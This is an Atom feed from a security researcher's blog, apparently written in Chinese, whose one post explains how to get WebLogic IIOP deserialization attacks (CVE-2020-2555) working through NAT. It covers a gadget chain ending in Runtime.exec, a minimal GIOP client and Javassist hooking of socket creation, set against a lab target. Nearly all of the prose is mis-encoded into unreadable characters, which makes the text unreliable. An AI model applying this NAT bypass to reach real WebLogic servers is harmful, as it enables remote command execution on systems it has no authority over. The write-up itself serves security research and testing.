<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>R4v3zn&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.r4v3zn.com/"/>
  <updated>2020-11-12T03:14:16.854Z</updated>
  <id>http://www.r4v3zn.com/</id>
  
  <author>
    <name>R4v3zn</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Weblogic IIOP åè®®NAT ç½‘ç»œç»•è¿‡</title>
    <link href="http://www.r4v3zn.com/posts/144eb4b6/"/>
    <id>http://www.r4v3zn.com/posts/144eb4b6/</id>
    <published>2020-11-11T08:29:50.000Z</published>
    <updated>2020-11-12T03:14:16.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>é€šå¸¸åœ¨æ¸—é€çš„è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å¾ˆå¤š Weblogic æœåŠ¡å™¨ï¼Œä½†é€šè¿‡ IIOP åè®®è¿›è¡Œå‘é€åºåˆ—åŒ–æ¶æ„ä»£ç åŒ…æ—¶ï¼Œä¼šé¢ä¸´ç€æ— æ³•å»ºç«‹é€šè®¯è¯·æ±‚å‘é€æ¶æ„åºåˆ—åŒ–å¤±è´¥ã€‚æœ€è¿‘å‚ä¸äº†ä¸€åœºåœ¨æˆéƒ½ä¸¾åŠçš„ã€ŠFreeTalk 2020 æˆéƒ½ç«™ã€‹ï¼Œæœ‰å¹¸åˆ†äº«äº†å…³äº Weblogic IIOP åè®® NAT ç»•è¿‡çš„å‡ ç§æ–¹å¼ã€‚</p><p>PPT ä¸‹è½½åœ°å€ï¼š<a href="https://img.zhiiyun.com/Weblogic_IIOP_NAT.pptx" target="_blank" rel="noopener">ã€ŠWeblogic IIOP åè®®NAT ç½‘ç»œç»•è¿‡ã€‹</a></p><h2 id="æˆæœæ¼”ç¤º"><a href="#æˆæœæ¼”ç¤º" class="headerlink" title="æˆæœæ¼”ç¤º"></a>æˆæœæ¼”ç¤º</h2><p>Goby  å·¥å…·ä¸­å…³äº Weblogic åŸºæœ¬éƒ½æ˜¯ç”¨äº† IIOP åè®®ç»•è¿‡çš„æ–¹æ¡ˆï¼Œæ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„æ¼æ´ä¸º CVE-2020-2551 æ¼æ´ã€‚</p><p><img src="https://img.zhiiyun.com/blog_f9a0b8ae6c2c0a53575d81a9c2efd0f4" alt=""></p><p>å†…éƒ¨å·¥å…· <code>weblogic-framework</code> ä½¿ç”¨äº†å¤šé¡¹æ ¸å¿ƒæŠ€æœ¯æ¥è¿›è¡Œä¼˜é›…çš„æµ‹è¯• Weblogicï¼Œå…¶ä¸­ä¹Ÿä½¿ç”¨äº† IIOP åè®®çš„ç»•è¿‡æ–¹æ¡ˆã€‚</p><p><img src="https://img.zhiiyun.com/blog_5cde992ba70cb89c6106681e4c3fad88" alt=""></p><h2 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h2><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œéå¸¸æœ‰æ¯”è¾ƒæåŠä¸€ä¸‹ä»¥ä¸‹è¿™äº›åè®®ç›¸å…³çš„å†…å®¹ï¼š</p><ul><li><p>RMIï¼šâ€‹ è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæœ¬è´¨ä¸Šæ˜¯ RPC æœåŠ¡çš„ JAVA å®ç°ï¼Œåº•å±‚å®ç°æ˜¯ JRMP åè®®ï¼Œä¸»è¦åœºæ™¯æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿã€‚</p></li><li><p>CORBAï¼šè·¨è¯­è¨€ï¼ˆC ++ã€Javaç­‰ï¼‰çš„é€šä¿¡ä½“ç³»ç»“æ„ï¼Œé€šå¸¸åœ¨ IIOP åè®®ä¸­ä½¿ç”¨ã€‚</p></li><li><p>GIOPï¼šä¸»è¦æä¾›æ ‡å‡†çš„ä¼ è¾“è¯­æ³•ä»¥åŠ ORB é€šä¿¡çš„ä¿¡æ¯æ ¼å¼æ ‡å‡†ã€‚</p></li><li><p>IIOPï¼šCORBA å¯¹è±¡ä¹‹é—´äº¤æµçš„åè®®ï¼ŒGIOP çš„å®ç°ã€‚</p></li><li><p>RMI-IIOPï¼šè§£å†³ RMI å’Œ CORBA/IIOP æ— æ³•åŒæ—¶ä½¿ç”¨çš„æŠ€æœ¯æ–¹æ¡ˆã€‚</p></li><li><p>Weblogic IIOPï¼šWeblogic è‡ªå®ç°çš„ RMI-IIOPã€‚</p></li><li><p>T3ï¼šWebLogic Server ä¸­çš„ RMI é€šä¿¡ä½¿ç”¨ T3 åè®®ä¼ è¾“ WebLogic Server å’Œå…¶ä»– Java ç¨‹åºï¼ŒåŒ…æ‹¬å®¢æˆ·ç«¯åŠå…¶ä»– WebLogic Server å®ä¾‹ä¹‹é—´ æ•°æ®ã€‚</p></li></ul><p>T3 åè®®æœ¬è´¨ä¸Š RMI ä¸­ä¼ è¾“æ•°æ®ä½¿ç”¨çš„åè®®ï¼Œä½†é€šè¿‡ä¸Šé¢æˆ‘ä»¬çœ‹åˆ° RMI-IIOP æ˜¯å¯ä»¥å…¼å®¹ RMI å’Œ IIOP çš„ï¼Œæ‰€ä»¥åœ¨ Weblogic ä¸­åªè¦å¯ä»¥é€šè¿‡ T3 åºåˆ—åŒ–æ¶æ„ä»£ç çš„éƒ½å¯ä»¥é€šè¿‡ IIOP åè®®è¿›è¡Œåºåˆ—åŒ–ï¼Œæ­£æ˜¯å› ä¸ºè¿™ç§æƒ…å†µï¼Œæˆ‘è¿›å…¥ Weblogic ç¬¬ä¸‰å­£åº¦æ·±åº¦è´¡çŒ®è€…åå•ã€‚</p><p><img src="https://img.zhiiyun.com/blog_81f97b9fad17cb59595f3dd18e73c489" alt=""></p><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><h3 id="IIOP-åºåˆ—åŒ–æ”»å‡»æµç¨‹"><a href="#IIOP-åºåˆ—åŒ–æ”»å‡»æµç¨‹" class="headerlink" title="IIOP åºåˆ—åŒ–æ”»å‡»æµç¨‹"></a>IIOP åºåˆ—åŒ–æ”»å‡»æµç¨‹</h3><p><img src="https://img.zhiiyun.com/blog_2434fdee367e541e79ff8fa9c557ed68" alt=""></p><p>ä¸€èˆ¬ IIOP åºåˆ—åŒ–æ”»å‡»çš„å¤§è‡´æµç¨‹ä¸»è¦ä¸ºé¦–å…ˆæ„å»ºæ¶æ„åºåˆ—åŒ–ä»£ç ï¼Œç„¶ååˆå§‹åŒ–ä¸Šä¸‹æ–‡å®ä¾‹ï¼Œæœ€åé€šè¿‡ <code>bind/rebind</code> è¿›è¡Œå‘é€æ¶æ„åºåˆ—åŒ–ä»£ç ï¼Œä¸‹å›¾ä¸ºå…³é”®ä»£ç ã€‚</p><p><img src="https://img.zhiiyun.com/blog_8a7fb81c0b6a8f3c94033c56123912cb" alt=""></p><h3 id="IIOP-åˆå§‹åŒ–ä¸Šä¸‹æ–‡æµç¨‹"><a href="#IIOP-åˆå§‹åŒ–ä¸Šä¸‹æ–‡æµç¨‹" class="headerlink" title="IIOP åˆå§‹åŒ–ä¸Šä¸‹æ–‡æµç¨‹"></a>IIOP åˆå§‹åŒ–ä¸Šä¸‹æ–‡æµç¨‹</h3><p>åˆå§‹åŒ–ä¸Šä¸‹æ–‡é€šè¿‡æ”»å‡»æµç¨‹ä¸­çš„ <code>new InitialContext(env)</code> è¿›è¡Œæ„å»ºï¼Œæœ€ç»ˆçš„å…¥å£ç‚¹é€šè¿‡ <code>getInitialContext</code> æ–¹æ³•è¿›è¡Œæ„å»ºï¼Œæœ€ç»ˆæ˜¯è¿›è¡Œæµå…¥åˆ° <code>InitialContextFactoryImpl.getInitialContext</code> è¿›è¡Œåˆå§‹åŒ–ä¸Šä¸‹æ–‡ã€‚</p><p><img src="https://img.zhiiyun.com/blog_b773a1b56d0bea105dbad0f3676cba6c" alt=""></p><p>åœ¨æµå…¥ <code>InitialContextFactoryImpl.getInitialContext</code> ä¹‹åä¼šé€šè¿‡ <code>obj = ORBHelper.getORBHelper().getORBReference</code> æ¥è¿›è¡Œè·å– <code>NameService</code>ï¼Œç„¶åå°†è·å–åˆ°çš„ <code>NameService</code> è¿›è¡Œå®ä¾‹åŒ–åˆ›å»ºä¸Šä¸‹æ–‡å®ä¾‹ï¼Œæä¾›åç»­çš„æ‰§è¡Œæ“ä½œã€‚</p><p><img src="https://img.zhiiyun.com/blog_1384f6e9fa4b8a40f7a55a7692f8e12d" alt=""></p><h3 id="rebind-æµç¨‹"><a href="#rebind-æµç¨‹" class="headerlink" title="rebind æµç¨‹"></a>rebind æµç¨‹</h3><p>æ‰§è¡Œ <code>rebind</code> æµç¨‹ä¸­ï¼Œé¦–å…ˆä¼šé€šè¿‡ <code>this.getContext</code> æ–¹æ³•è¿›è¡Œè·å–å‰é¢æ‰€è®²çš„ä¸Šä¸‹å¯¹è±¡ï¼Œç„¶åé€šè¿‡ <code>rebind_any</code> è¿›è¡Œå‘å‘é€åºåˆ—åŒ–ä»£ç ï¼Œå½“å‰åœ¨æ­¤ä¹‹å‰å·²ç»é€šè¿‡ç»è¿‡åºåˆ—åŒ–çš„äº†ã€‚</p><p><img src="https://img.zhiiyun.com/blog_aaf2e6a0e456452b88fe111a616703c6" alt=""></p><p>åœ¨ <code>rebind_any</code> ä¸­ï¼Œé¦–å…ˆä¼šé€šè¿‡ <code>this._request</code> è¿›è¡Œå‘é€ <code>rebind_any</code> å»ºç«‹ Socket é€šè®¯ï¼Œæœ€åé€šè¿‡ <code>this._invoke</code> æ–¹æ³•è¿›è¡Œæ‰§è¡Œæœ€ç»ˆçš„æ“ä½œå‘é€åºåˆ—åŒ–ä»£ç ã€‚</p><p><img src="https://img.zhiiyun.com/blog_107c58a0ca196a45dca9ccdbea1c13fc" alt=""></p><h3 id="å¤§è‡´æµç¨‹"><a href="#å¤§è‡´æµç¨‹" class="headerlink" title="å¤§è‡´æµç¨‹"></a>å¤§è‡´æµç¨‹</h3><p>æ‰€ä»¥æœ€ç»ˆå¤§è‡´çš„æ‰§è¡Œæµç¨‹æ˜¯å¦‚ä¸‹å›¾ï¼Œè·å– <code>NameService</code>ï¼ŒåŸºäºè·å–çš„ä¿¡æ¯è¿›è¡Œåˆ›å»ºä¸Šä¸‹æ–‡å®ä¾‹ï¼ˆè·å–å®é™…è¿æ¥ä¿¡æ¯ï¼‰ï¼Œç„¶åè¿›è¡Œå‘èµ· <code>request</code> è¯·æ±‚ï¼Œæœ€åè¿›è¡Œæ‰§è¡Œ <code>rebind_any</code> æ“ä½œã€‚</p><p><img src="https://img.zhiiyun.com/blog_5fc3d39201562d32722a5c2bd9d1a436" alt=""></p><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ul><li>Weblogicï¼š12.1.3.0</li><li>åè®®ï¼šIIOP</li><li>æ¼æ´ç¼–å·ï¼šCVE-2020-2555</li><li>å†…ç½‘ï¼ˆWindowsï¼‰ï¼š<a href="http://10.10.10.173:7001" target="_blank" rel="noopener">http://10.10.10.173:7001</a></li><li>NAT ç½‘ç»œï¼ˆ vulfocus ï¼‰ ï¼š <a href="http://118.193.36.37:32769/" target="_blank" rel="noopener">http://118.193.36.37:32769/</a>  å†…éƒ¨ IPï¼š 172.17.0.5</li></ul><p>NAT ç½‘ç»œæ„å»ºé€šè¿‡ <code>http://vulfocus.fofa.so/</code> è¿›è¡Œæ­å»ºæ„é€ ã€‚</p><p><img src="https://img.zhiiyun.com/blog_cd984ac2669dd1025f5563d3c67c14dd" alt=""></p><h2 id="æˆå› "><a href="#æˆå› " class="headerlink" title="æˆå› "></a>æˆå› </h2><p>åœ¨åç»­çš„è°ƒè¯•ä»¥åŠç ”ç©¶ä¸­æˆ‘ä»¬æ‰€ä½¿ç”¨çš„ç‰ˆæœ¬ä¸º 12.1.3.0 ç‰ˆæœ¬ï¼Œæ¼æ´ä¸º CVE-2020-2555 æ¼æ´ï¼Œä»¥ä¸‹ä¸ºæ¼æ´ POCï¼Œä»¥åŠæ¼æ´æ‰§è¡Œé“¾ï¼Œåœ¨è¿™é‡Œä¸å¤šè®²è¯¥æ¼æ´ï¼Œæœ‰å…´è¶£çš„å¯ä»¥ç§»æ­¥<a href="https://www.r4v3zn.com/posts/975312a1/">æ¼«è°ˆ Weblogic CVE-2020-2555</a>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_1e4b4e6542ff03eef30ae7d6973efd64" alt=""></p><p>æ‰§è¡Œé“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        LimitFilter.toString()</span><br><span class="line">            ChainedExtractor.extract()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å¯ä»¥ä¸ Weblogic æ‰€å¤„åŒä¸€ç½‘æ®µå¹¶ä¸”å¯è¾¾çš„æ—¶ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="https://img.zhiiyun.com/blog_d46df84a0424809fe9211538eff2202c" alt=""></p><p>é€šè¿‡ Wireshark è¿›è¡ŒæŠ“åŒ…å¯ä»¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å…±é€šè®¯äº† 2 æ¬¡ï¼Œç¬¬ä¸€æ¬¡å‘é€ <code>LocateRequest</code> ç±»å‹çš„ <code>LocateRequest</code> çš„é€šè®¯æ“ä½œè·å– <code>NameService</code>ï¼Œç¬¬äºŒæ¬¡å‘é€ <code>Request</code> ç±»å‹çš„ <code>rebind_any</code> æ“ä½œè¿›è¡Œå‘é€åºåˆ—åŒ–ä»£ç ã€‚</p><p><img src="https://img.zhiiyun.com/blog_0d68bd61f6da9cdf907bea14f00acf3e" alt=""></p><p>è€Œè¿›è¡Œæµ‹è¯•å…¬ç½‘ä¸­çš„é¶æœºæ—¶æŠ›å‡º <code>Operation time out</code> å¼‚å¸¸ï¼Œå…·ä½“ä¿¡æ¯å¦‚ä¸‹å›¾ã€‚</p><p><img src="https://img.zhiiyun.com/blog_769ba7b20feef06758a87cce327a4777" alt=""></p><p>è€Œåœ¨ Wireshark ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¸ç¬¬ä¸€æ¬¡è·å–<code>NameService</code>ä¸­çš„å†…ç½‘ IPã€ç«¯å£è¿›è¡Œäº† Socket é€šä¿¡ã€‚</p><p><img src="https://img.zhiiyun.com/blog_9985971f686486e53cea3c24304462c6" alt=""></p><p>è€Œåœ¨æ‰§è¡Œçš„æµç¨‹ä¸­åœç•™åœ¨äº† <code>createEndPoint</code> æ–¹æ³•ä¸­ï¼Œæ‰€ä»¥é€šä¿¡é—®é¢˜å¤§æ¦‚ç‡æ˜¯åœ¨æ­¤æ–¹æ³•ä¸­å¼•å‘çš„ã€‚</p><p><img src="https://img.zhiiyun.com/blog_9a401afc46959ebafed9061ee540e423" alt=""></p><p>åœ¨ <code>createEndPoint</code> æ–¹æ³•ä¸­ï¼Œæœ€åé€šè¿‡ <code>MuxableSocketIIOP.createConnection</code> æ–¹æ³•è¿›è¡Œå»ºç«‹ Socket é€šä¿¡ï¼Œæ­¤æ—¶çš„é€šä¿¡å˜ä¸ºäº† Weblogic è¿è¡Œçš„å†…ç½‘ IP å’Œç«¯å£ã€‚</p><p><img src="https://img.zhiiyun.com/blog_2e4459b1a0781d9a9d2477804db549fc" alt=""></p><p>æ‰€ä»¥å¤§ä½“çš„æƒ…å†µä¸ºå¦‚ä¸‹å›¾ï¼Œé—®é¢˜å‡ºç°åœ¨å‘èµ· <code>request</code> æ—¶è°ƒç”¨çš„ <code>createEndPoint</code> æ–¹æ³•ä¸­ï¼Œç”±äº <code>createEndPoint</code> æ— æ³•æ­£å¸¸å»ºç«‹ Socket é€šä¿¡å¯¼è‡´åç»­çš„æ“ä½œæ— æ³•æ­£å¸¸ç§©åºã€‚</p><p><img src="https://img.zhiiyun.com/blog_462206123307b6783390c0e5d4c0ffa6" alt=""></p><p>å…¶å®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ Weblogic å¯åŠ¨æ—¥å¿—ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ° Weblogic å…³äºç«¯å£å’Œåè®®åˆ†é…çš„æƒ…å†µï¼ŒåŸºæœ¬åˆ†é…éƒ½æ˜¯å†…ç½‘ç½‘å¡çš„IPå’Œç«¯å£åŒæ—¶ä¼šè¿›è¡Œç›‘å¬ <code>0.0.0.0:7001</code> æ¥å¤„ç†åè®®çš„è¯·æ±‚æ“ä½œï¼Œé‚£ä¹ˆç°åœ¨é—®é¢˜æ¥äº†ï¼Œå…¬ç½‘ä¸­çš„ Weblogic æœåŠ¡å™¨ 99% åˆ†é…çš„éƒ½æ˜¯å†…ç½‘ IP å’Œç«¯å£ã€‚</p><h2 id="IIOP-NAT-ç»•è¿‡æ–¹æ¡ˆ"><a href="#IIOP-NAT-ç»•è¿‡æ–¹æ¡ˆ" class="headerlink" title="IIOP NAT ç»•è¿‡æ–¹æ¡ˆ"></a>IIOP NAT ç»•è¿‡æ–¹æ¡ˆ</h2><p>ç”±äºé—®é¢˜å‘ç”Ÿåœ¨å“åº”çš„ Weblogic åœ¨è·å– NameService æ—¶ï¼Œå“åº”çš„ IPå’Œç«¯å£ä¸ºå†…ç½‘ä¸­çš„ç«¯å£ï¼Œå¯¼è‡´åœ¨åç»­ <code>createEndPoint</code> å»ºç«‹ Socket é€šä¿¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œåœ¨å»ºç«‹ Socket é€šä¿¡ä¹‹å‰ä¿®æ”¹ä¸ºæ­£ç¡®çš„ IPå’Œç«¯å£ï¼ˆå…¬ç½‘ä¸­çš„IPå’Œç«¯å£ï¼‰ã€‚</p><p><img src="https://img.zhiiyun.com/blog_ce89e265e6e4fb1f352aca6fbb891ae6" alt=""></p><h3 id="GIOP-åè®®æç®€å®ç°"><a href="#GIOP-åè®®æç®€å®ç°" class="headerlink" title="GIOP åè®®æç®€å®ç°"></a>GIOP åè®®æç®€å®ç°</h3><p>å½“æˆ‘ä»¬ä¸æœåŠ¡å™¨æ‰€å¤„åŒä¸€ç½‘æ®µæ—¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å…±é€šè®¯äº† 2 æ¬¡ï¼Œç¬¬ä¸€æ¬¡å‘é€ <code>LocateRequest</code> ç±»å‹çš„ <code>LocateRequest</code> çš„é€šè®¯æ“ä½œè·å– <code>NameService</code>ï¼Œç¬¬äºŒæ¬¡å‘é€ <code>Request</code> ç±»å‹çš„ <code>rebind_any</code> æ“ä½œè¿›è¡Œå‘é€åºåˆ—åŒ–ä»£ç ã€‚</p><p><img src="https://img.zhiiyun.com/blog_36b6f5b4c07c96ecaccb198abdfb417a" alt=""></p><p>æ‰€ä»¥æˆ‘ä»¬æ ¹æ® Wireshark ä¸­çš„ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œæ„å»ºæç®€çš„ GIOP å®ç°ï¼Œå¤§ä½“å¦‚ä¸‹ï¼š</p><ol><li>è¯·æ±‚ LocateRequestï¼Œè·å– NameService ä»¥åŠè·å– key</li><li>è¯·æ±‚ Requestï¼Œæ‰§è¡Œ rebind_any æ“ä½œï¼Œå‘é€åºåˆ—åŒ–ä»£ç </li></ol><h4 id="GIOP-åè®®"><a href="#GIOP-åè®®" class="headerlink" title="GIOP åè®®"></a>GIOP åè®®</h4><p>GIOP åè®®å¤§è‡´ç”± Header å’Œ Message Type è¿›è¡Œæ„æˆï¼Œåœ¨ Header åŒ…å«äº† Magicã€Versionã€Message Typeã€Message Sizeã€‚</p><p><img src="https://img.zhiiyun.com/blog_4ccac63d8b1b0eba1168ff640e17e54f" alt=""></p><p>Message Type çš„ç±»å‹å¦‚ä¸‹ï¼š</p><table><thead><tr><th style="text-align:center">æ¶ˆæ¯ç±»å‹</th><th style="text-align:center">å§‹å‘æ–¹</th></tr></thead><tbody><tr><td style="text-align:center">Request</td><td style="text-align:center">Client</td></tr><tr><td style="text-align:center">Request</td><td style="text-align:center">Server</td></tr><tr><td style="text-align:center">CancelRequest</td><td style="text-align:center">Client</td></tr><tr><td style="text-align:center">LocateRequest</td><td style="text-align:center">Client</td></tr><tr><td style="text-align:center">LocateReply</td><td style="text-align:center">Server</td></tr><tr><td style="text-align:center">CloseConnection</td><td style="text-align:center">Server</td></tr><tr><td style="text-align:center">MessageError</td><td style="text-align:center">Both</td></tr><tr><td style="text-align:center">Fragment</td><td style="text-align:center">Both</td></tr></tbody></table><h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p><img src="https://img.zhiiyun.com/blog_81256145edd7fc6453a6d8cfe1085705" alt=""></p><p>è·å– NameService è¯·æ±‚ä»£ç å®ç°ï¼š</p><p><img src="https://img.zhiiyun.com/blog_d385e7ccf33a6b872f5662b09f70568d" alt=""></p><p>æ‰§è¡Œ rebind_any æ“ä½œä»£ç å®ç°ï¼š</p><p><img src="https://img.zhiiyun.com/blog_92cc2d6cf84590a9b4fa706d62105bd8" alt=""></p><p>æœ€ç»ˆæ•ˆæœï¼š</p><p><img src="https://img.zhiiyun.com/blog_9c1e9fdd06a3a58b280a4f416154b0be" alt=""></p><h3 id="Javassist-å­—èŠ‚ç åº“"><a href="#Javassist-å­—èŠ‚ç åº“" class="headerlink" title="Javassist å­—èŠ‚ç åº“"></a>Javassist å­—èŠ‚ç åº“</h3><p>Javassist (JAVA programming ASSISTant) æ˜¯åœ¨ Java ä¸­ç¼–è¾‘å­—èŠ‚ç çš„ç±»åº“ï¼Œå®ƒä½¿ Java ç¨‹åºèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶å®šä¹‰ä¸€ä¸ªæ–°ç±»ï¼Œå¹¶åœ¨ JVM åŠ è½½æ—¶ä¿®æ”¹ç±»æ–‡ä»¶ã€‚</p><ul><li>Javassist.CtClass æ˜¯ç±»æ–‡ä»¶çš„æŠ½è±¡è¡¨ç¤ºå½¢å¼</li><li>Javassist.CtMethod æ˜¯ç±»æ–¹æ³•çš„æŠ½è±¡è¡¨ç¤ºå½¢å¼</li></ul><p>è¯»å–ç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.get(&quot;test.Rectangle&quot;);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.makeClass(&quot;Point&quot;);</span><br></pre></td></tr></table></figure><p>ç»§æ‰¿</p><p><code>cc.setSuperclass(pool.get(&quot;test.Point&quot;));</code></p><p>å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cc.writeFile();</span><br><span class="line">cc.toClass();</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>toClass()</code> ä¼šæŠŠå½“å‰ä¿®æ”¹çš„ Class åŠ å…¥åˆ°å½“å‰çš„ <code>ClassLoader</code> ä¸­ã€‚</p><p>åˆ›å»ºæ–¹æ³•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.makeClass(&quot;Point&quot;);</span><br><span class="line">CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, cc);</span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹æ–¹æ³•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtMethod ctMethod = ctClass.getDeclaredMethod(&quot;hello&quot;);</span><br><span class="line">ctMethod.setBody(&quot;System.out.println(\&quot;set body\&quot;);&quot;);</span><br><span class="line">ctMethod.insertBefore(&quot;System.out.println(\&quot;set before\&quot;);&quot;);</span><br><span class="line">ctMethod.insertAfter(&quot;System.out.println(\&quot;set after\&quot;);&quot;);</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡ Javassist è¿›è¡Œå®ç°æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å»ºç«‹ Socket é€šä¿¡ä¹‹å‰çš„æ–¹æ³•ï¼Œå°† ipã€ç«¯å£æ›¿æ¢ä¸ºæ­£å¸¸çš„ IP å’Œç«¯å£ï¼Œåœ¨è¿™é‡Œé€‰å–çš„æ˜¯ <code>newSocket</code> æ–¹æ³•ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸º <code>host</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º <code>port</code>ã€‚</p><p><img src="https://img.zhiiyun.com/blog_9ec2b7d5fa5b02bdab4bad3501de4c8d" alt=""></p><p>æœ€ç»ˆä¿®æ”¹çš„å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://img.zhiiyun.com/blog_73a6947e835969604559bbb5efd92f8b" alt=""></p><h4 id="å®ç°-1"><a href="#å®ç°-1" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œä»…éœ€è¦åœ¨æ‰§è¡Œåˆ° <code>newSocket</code> æ–¹æ³•æ—¶ï¼Œå°†è¿æ¥åˆ° IP å’Œç«¯å£è®¾ç½®ä¸ºæ­£ç¡®çš„ IP å’Œ ç«¯å£ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://img.zhiiyun.com/blog_f377e95a1aeea487b7fc70846a7a1de6" alt=""></p><p>æœ€ç»ˆæ•ˆæœï¼š</p><p><img src="https://img.zhiiyun.com/blog_d341a979e60f53ec95538a5b44552169" alt=""></p><h3 id="æºä»£ç ä¿®æ”¹"><a href="#æºä»£ç ä¿®æ”¹" class="headerlink" title="æºä»£ç ä¿®æ”¹"></a>æºä»£ç ä¿®æ”¹</h3><p><img src="https://img.zhiiyun.com/blog_6361fd46bb5c667f3c63970bf2b2c127" alt=""></p><p>åœ¨æ‰§è¡Œçš„æµç¨‹ä¸­æœ€ç»ˆæ‰§è¡Œåˆ°äº† <code>createEndPoint</code> æ–¹æ³•ä¸­ï¼Œä»æ‰§è¡Œæµç¨‹æ¥çœ‹ä¸»è¦å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://img.zhiiyun.com/blog_ba6fbbcdd0b408b16d1940faf923241e" alt=""></p><p>åœ¨æ‰§è¡Œ <code>rebind</code> æ–¹æ³•å‘é€åºåˆ—åŒ–ä»£ç æ—¶ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ­¤æ—¶å·²ç»å˜æˆäº† Weblogic å†…ç½‘ä¸­è¿è¡Œçš„ IP å’Œ ç«¯å£ï¼Œç›´åˆ°ç¨‹åºæ‰§è¡Œåˆ° <code>createEndPoint</code> æŠ›å‡ºå¼‚å¸¸ã€‚</p><p><img src="https://img.zhiiyun.com/blog_68e2cdf372d6bd00cc203649f2b04ff1" alt=""></p><p>è€Œæ‰§è¡Œåˆ° <code>getInvocationIOR</code> æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨ <code>IIOPRemoteRef.locateIORForRequest</code> æ–¹æ³•æ¥è¿›è¡Œå¯»æ‰¾ <code>IOR</code>ï¼Œå¹¶ä¸”å°†å¯»æ‰¾åˆ°çš„ <code>IOR</code> è®¾ç½®ä¸ºå½“ä½œå½“å‰ <code>IOR</code> è¿›è¡Œè¿”å›æä¾›ä½¿ç”¨ã€‚</p><p><img src="https://img.zhiiyun.com/blog_91e5262ec571dd744a9f10856de5c564" alt=""></p><p>åœ¨è¿›å…¥ <code>locateIORForRequest</code> æ–¹æ³•ä¹‹åä¼šé€šè¿‡ <code>EndPointManager.findOrCreateEndPoint</code> æ¥è¿›è¡Œå¯»æ‰¾æˆ–åˆ›å»ºç»“æŸåˆ‡ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶ <code>IOR</code> çš„ <code>host</code>ã€<code>port</code> 